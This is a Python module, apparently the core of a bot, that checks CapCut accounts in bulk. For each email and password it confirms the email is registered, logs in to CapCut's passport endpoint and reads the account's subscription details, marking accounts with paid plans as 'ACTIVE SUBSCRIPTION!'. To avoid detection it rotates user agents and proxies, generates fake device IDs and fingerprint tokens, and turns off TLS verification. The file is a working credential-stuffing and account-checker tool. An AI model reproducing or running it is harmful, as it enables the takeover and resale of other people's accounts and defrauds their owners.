# capcut_core.py  —  Bot-only edition
import json
import random
import re
import time
from datetime import datetime
from urllib.parse import quote

import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

_USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:142.0) Gecko/20100101 Firefox/142.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
]

COUNTRY_MAP = {
    "AF": "Afghanistan 🇦🇫", "AL": "Albania 🇦🇱", "DZ": "Algeria 🇩🇿",
    "AR": "Argentina 🇦🇷", "AM": "Armenia 🇦🇲", "AU": "Australia 🇦🇺",
    "AT": "Austria 🇦🇹", "AZ": "Azerbaijan 🇦🇿", "BH": "Bahrain 🇧🇭",
    "BD": "Bangladesh 🇧🇩", "BY": "Belarus 🇧🇾", "BE": "Belgium 🇧🇪",
    "BO": "Bolivia 🇧🇴", "BA": "Bosnia 🇧🇦", "BR": "Brazil 🇧🇷",
    "BG": "Bulgaria 🇧🇬", "KH": "Cambodia 🇰🇭", "CM": "Cameroon 🇨🇲",
    "CA": "Canada 🇨🇦", "CL": "Chile 🇨🇱", "CN": "China 🇨🇳",
    "CO": "Colombia 🇨🇴", "CR": "Costa Rica 🇨🇷", "HR": "Croatia 🇭🇷",
    "CY": "Cyprus 🇨🇾", "CZ": "Czech Republic 🇨🇿", "DK": "Denmark 🇩🇰",
    "DO": "Dominican Republic 🇩🇴", "EC": "Ecuador 🇪🇨", "EG": "Egypt 🇪🇬",
    "EE": "Estonia 🇪🇪", "FI": "Finland 🇫🇮", "FR": "France 🇫🇷",
    "DE": "Germany 🇩🇪", "GR": "Greece 🇬🇷", "GT": "Guatemala 🇬🇹",
    "HK": "Hong Kong 🇭🇰", "HU": "Hungary 🇭🇺", "IN": "India 🇮🇳",
    "ID": "Indonesia 🇮🇩", "IQ": "Iraq 🇮🇶", "IE": "Ireland 🇮🇪",
    "IL": "Israel 🇮🇱", "IT": "Italy 🇮🇹", "JP": "Japan 🇯🇵",
    "JO": "Jordan 🇯🇴", "KZ": "Kazakhstan 🇰🇿", "KE": "Kenya 🇰🇪",
    "KW": "Kuwait 🇰🇼", "LV": "Latvia 🇱🇻", "LB": "Lebanon 🇱🇧",
    "LT": "Lithuania 🇱🇹", "MY": "Malaysia 🇲🇾", "MX": "Mexico 🇲🇽",
    "NL": "Netherlands 🇳🇱", "NZ": "New Zealand 🇳🇿", "NG": "Nigeria 🇳🇬",
    "NO": "Norway 🇳🇴", "PK": "Pakistan 🇵🇰", "PA": "Panama 🇵🇦",
    "PE": "Peru 🇵🇪", "PH": "Philippines 🇵🇭", "PL": "Poland 🇵🇱",
    "PT": "Portugal 🇵🇹", "QA": "Qatar 🇶🇦", "RO": "Romania 🇷🇴",
    "RU": "Russia 🇷🇺", "SA": "Saudi Arabia 🇸🇦", "RS": "Serbia 🇷🇸",
    "SG": "Singapore 🇸🇬", "ZA": "South Africa 🇿🇦", "KR": "South Korea 🇰🇷",
    "ES": "Spain 🇪🇸", "LK": "Sri Lanka 🇱🇰", "SE": "Sweden 🇸🇪",
    "CH": "Switzerland 🇨🇭", "TW": "Taiwan 🇹🇼", "TH": "Thailand 🇹🇭",
    "TR": "Turkey 🇹🇷", "UA": "Ukraine 🇺🇦", "AE": "UAE 🇦🇪",
    "GB": "United Kingdom 🇬🇧", "US": "United States 🇺🇸", "VN": "Vietnam 🇻🇳",
}

_PROXY_ERRORS = (
    requests.exceptions.ProxyError,
    requests.exceptions.ConnectionError,
    requests.exceptions.ConnectTimeout,
    requests.exceptions.ReadTimeout,
)

# ─────────────────────────────────────────────
#  Normalizers
# ─────────────────────────────────────────────

_CYCLE_MAP = {
    "month":     "Monthly",
    "monthly":   "Monthly",
    "1":         "Monthly",
    "year":      "Yearly",
    "yearly":    "Yearly",
    "annual":    "Yearly",
    "12":        "Yearly",
    "week":      "Weekly",
    "weekly":    "Weekly",
    "lifetime":  "Lifetime",
    "forever":   "Lifetime",
    "quarter":   "Quarterly",
    "quarterly": "Quarterly",
    "3":         "Quarterly",
    "half":      "Semi-Annual",
    "6":         "Semi-Annual",
}

def _normalize_cycle(raw) -> str:
    if not raw:
        return "N/A"
    return _CYCLE_MAP.get(str(raw).lower().strip(), str(raw).title())


_RENEWAL_MAP = {
    "auto":     "Auto-Renew ✅",
    "un-auto":  "Non-Renewing ❌",
    "un_auto":  "Non-Renewing ❌",
    "manual":   "Manual",
    "lifetime": "Lifetime ♾️",
    "gift":     "Gift 🎁",
    "trial":    "Free Trial",
}

def _normalize_renewal(raw) -> str:
    if not raw:
        return "N/A"
    return _RENEWAL_MAP.get(str(raw).lower().strip(), str(raw).upper())


# ─────────────────────────────────────────────
#  Helpers
# ─────────────────────────────────────────────

def _generate_did() -> str:
    return str(random.randint(7_000_000_000_000_000_000, 7_999_999_999_999_999_999))


def _format_timestamp(ts) -> str:
    try:
        if ts and int(ts) > 0:
            return datetime.fromtimestamp(int(ts)).strftime("%Y-%m-%d")
    except Exception:
        pass
    return "N/A"


def _days_left(date_str: str) -> int:
    try:
        return (datetime.strptime(date_str, "%Y-%m-%d") - datetime.now()).days
    except Exception:
        return -1


def _fetch_verify_fp(session: requests.Session, ua: str) -> str:
    try:
        resp = session.get(
            "https://www.capcut.com/login",
            headers={"User-Agent": ua},
            timeout=15,
            verify=False,
        )
        match = re.search(r'verifyFp["\s:=]+["\']+(verify_\w+)["\']', resp.text)
        if match:
            return match.group(1)
    except Exception:
        pass
    h = lambda n: "".join(random.choices("0123456789abcdef", k=n))
    return f"verify_{h(8)}_{h(8)}-{h(4)}-{h(4)}-{h(4)}-{h(12)}"


# ─────────────────────────────────────────────
#  Checker class
# ─────────────────────────────────────────────

class CapCutChecker:
    def __init__(self, email: str, password: str, proxy_url: str | None = None):
        self.email = email
        self.password = password
        self.session = requests.Session()
        if proxy_url:
            self.session.proxies = {"http": proxy_url, "https": proxy_url}
        self.ua = random.choice(_USER_AGENTS)
        self.csrf_token = ""
        self.cookies: dict = {}
        self.store_country = "us"
        self.did = _generate_did()
        self.verify_fp = _fetch_verify_fp(self.session, self.ua)
        self.user_id = ""

    def run_check(self) -> dict:
        base = {
            "email":         self.email,
            "password":      self.password,
            "success":       False,
            "message":       "",
            "plan":          "N/A",
            "expiry":        "N/A",
            "days_left":     "N/A",
            "renewal":       "N/A",
            "billing_cycle": "N/A",
            "region":        "N/A",
            "country":       "N/A",
            # Extra extracted fields
            "start_date":    "N/A",
            "product_name":  "N/A",
            "platform":      "N/A",
            "is_trial":      False,
            "status":        "N/A",
        }

        if not self._check_email():
            base["message"] = "Email not registered"
            return base

        if not self._login():
            base["message"] = "Login failed"
            return base

        if not self._get_subscription(base):
            base["message"] = "Failed to fetch subscription"
            return base

        plan     = base.get("plan", "FREE")
        days     = base.get("days_left", "N/A")

        is_expired = isinstance(days, int) and days < 0
        is_free    = plan in ("FREE", "N/A", "free", "")

        if is_free:
            base["success"] = False
            base["message"] = "Valid account — no paid plan"
            base["status"]  = "FREE"
        elif is_expired:
            base["success"] = False
            base["message"] = f"Plan expired {abs(days)} days ago"
            base["status"]  = "EXPIRED"
        else:
            base["success"] = True
            base["message"] = "ACTIVE SUBSCRIPTION!"
            base["status"]  = "ACTIVE"

        return base

    # ── Step 1 ─────────────────────────────────────────────────────

    def _check_email(self) -> bool:
        url = "https://login-row.www.capcut.com/passport/web/user/check_email_registered"
        params = {
            "aid": "348188",
            "account_sdk_source": "web",
            "sdk_version": "2.1.10-tiktok",
            "language": "en",
            "verifyFp": self.verify_fp,
        }
        headers = {
            "User-Agent": self.ua,
            "Accept": "application/json, text/plain, */*",
            "Accept-Language": "en-US,en;q=0.5",
            "Origin": "https://www.capcut.com",
            "Referer": "https://www.capcut.com/",
            "Content-Type": "application/x-www-form-urlencoded",
        }
        body = f"mix_mode=1&email={quote(self.email)}&fixed_mix_mode=1"
        try:
            resp = self.session.post(url, params=params, headers=headers,
                                     data=body, timeout=30, verify=False)
            if "passport_csrf_token" in self.session.cookies:
                self.csrf_token = self.session.cookies["passport_csrf_token"]
            self.cookies = dict(self.session.cookies)
            try:
                return bool(resp.json().get("data", {}).get("is_registered", 0))
            except Exception:
                return '"is_registered":1' in resp.text
        except Exception:
            return False

    # ── Step 2 ─────────────────────────────────────────────────────

    def _login(self) -> bool:
        url = "https://login-row.www.capcut.com/passport/web/email/login/"
        params = {
            "aid": "348188",
            "account_sdk_source": "web",
            "sdk_version": "2.1.10-tiktok",
            "language": "en",
            "verifyFp": self.verify_fp,
        }
        headers = {
            "Host": "login-row.www.capcut.com",
            "User-Agent": self.ua,
            "Accept": "application/json, text/javascript",
            "Accept-Language": "en-US,en;q=0.5",
            "X-Tt-Passport-Csrf-Token": self.csrf_token,
            "Appid": "348188",
            "Did": self.did,
            "Store-Country-Code": "ph",
            "Store-Country-Code-Src": "uid",
            "Origin": "https://www.capcut.com",
            "Referer": "https://www.capcut.com/",
            "Content-Type": "application/x-www-form-urlencoded",
        }
        body = (
            f"mix_mode=1&email={quote(self.email)}"
            f"&password={quote(self.password)}&check_region=1&fixed_mix_mode=1"
        )
        try:
            resp = self.session.post(url, params=params, headers=headers,
                                     data=body, timeout=30, verify=False)
            if "Maximum number of attempts" in resp.text:
                return False
            if '"message":"success"' in resp.text:
                self.cookies = dict(self.session.cookies)
                try:
                    rj = resp.json()
                    self.user_id = str(rj.get("data", {}).get("user_id", ""))
                except Exception:
                    pass
                if "store-country-code" in self.session.cookies:
                    self.store_country = self.session.cookies["store-country-code"]
                return True
            return False
        except Exception:
            return False

    # ── Step 3 ─────────────────────────────────────────────────────

    def _get_subscription(self, result: dict) -> bool:
        url = "https://commerce-api-sg.capcut.com/commerce/v1/subscription/user_info"
        cookie_str = "; ".join(f"{k}={v}" for k, v in self.cookies.items())
        headers = {
            "Host": "commerce-api-sg.capcut.com",
            "User-Agent": self.ua,
            "Accept": "application/json, text/plain, */*",
            "Accept-Language": "en-US,en;q=0.5",
            "Appid": "348188",
            "Loc": self.store_country.upper(),
            "Lan": "en",
            "Pf": "7",
            "Appvr": "12.4.0",
            "Tdid": "",
            "Sign-Ver": "1",
            "App-Sdk-Version": "48.0.0",
            "Device-Time": str(int(time.time())),
            "Did": self.did,
            "Store-Country-Code": self.store_country,
            "Store-Country-Code-Src": "uid",
            "Origin": "https://www.capcut.com",
            "Referer": "https://www.capcut.com/",
            "Content-Type": "application/json",
            "Cookie": cookie_str,
        }
        body = '{"aid":"348188","scene":"vip"}'
        try:
            resp = self.session.post(url, headers=headers, data=body,
                                     timeout=30, verify=False)
            if resp.status_code != 200:
                return False

            rj = resp.json()

            # Debug: log full response so you can find new fields
            print(f"[CapCut DEBUG] full response: {json.dumps(rj)[:2000]}")

            if str(rj.get("ret")) != "0":
                return False

            data       = rj.get("data", {})
            vip_levels = data.get("vip_levels", [])

            response_data: dict = {}
            try:
                raw = rj.get("response", {})
                response_data = json.loads(raw) if isinstance(raw, str) else (raw or {})
            except Exception:
                pass

            # ── Plan + extra fields ────────────────────────────────
            raw_cycle   = ""
            raw_renewal = ""
            start_ts    = 0
            end_ts      = 0

            if vip_levels:
                vl = vip_levels[0]
                raw_plan = vl.get("level") or vl.get("name") or "VIP"
                result["plan"]         = raw_plan.upper()
                result["product_name"] = vl.get("product_name") or vl.get("name") or raw_plan
                result["platform"]     = vl.get("platform") or vl.get("pay_channel") or "N/A"
                result["is_trial"]     = bool(vl.get("is_trial", False))

                # Billing — try multiple possible keys
                raw_cycle = (
                    vl.get("cycle_unit")
                    or vl.get("billing_cycle")
                    or vl.get("period")
                    or vl.get("cycle")
                    or data.get("cycle_unit")
                    or ""
                )
                raw_renewal = (
                    vl.get("subscribe_type")
                    or vl.get("renewal_type")
                    or data.get("subscribe_type")
                    or ""
                )
                start_ts = vl.get("start_time") or data.get("start_time", 0)
                end_ts   = vl.get("end_time")   or data.get("end_time", 0)

            elif response_data and response_data.get("flag"):
                result["plan"] = response_data.get("level", "VIP").upper()
                raw_cycle      = response_data.get("cycle_unit", "") or response_data.get("period", "")
                raw_renewal    = response_data.get("subscribe_type", "")
                start_ts       = response_data.get("start_time", 0)
                end_ts         = response_data.get("end_time", 0)

            else:
                result["plan"] = "FREE"
                raw_cycle      = data.get("cycle_unit", "")
                raw_renewal    = data.get("subscribe_type", "")
                start_ts       = data.get("start_time", 0)
                end_ts         = data.get("end_time", 0)

            result["billing_cycle"] = _normalize_cycle(raw_cycle)
            result["renewal"]       = _normalize_renewal(raw_renewal)

            if start_ts:
                result["start_date"] = _format_timestamp(start_ts)

            if end_ts:
                expiry              = _format_timestamp(end_ts)
                result["expiry"]    = expiry
                result["days_left"] = _days_left(expiry)
            else:
                result["expiry"]    = "No Expiry" if result["plan"] not in ("FREE", "N/A") else "N/A"
                result["days_left"] = "N/A"

            country_code        = self.cookies.get("store-country-code", "US").upper()
            result["region"]    = country_code
            result["country"]   = COUNTRY_MAP.get(country_code, country_code)

            return True

        except Exception as e:
            print(f"[CapCut] subscription error: {e}")
            return False


# ─────────────────────────────────────────────
#  Public API
# ─────────────────────────────────────────────

def check_capcut(
    email: str,
    password: str,
    proxy: str | None = None,
    stop_event=None,
) -> dict:
    if stop_event and stop_event.is_set():
        raise InterruptedError("Stopped")

    checker = CapCutChecker(email, password, proxy_url=proxy)
    try:
        return checker.run_check()
    except _PROXY_ERRORS as e:
        return {
            "email": email, "password": password,
            "success": False, "message": f"Proxy error: {e}",
        }
    except Exception as e:
        return {
            "email": email, "password": password,
            "success": False, "message": f"Error: {str(e)[:80]}",
        }
    finally:
        checker.session.close()
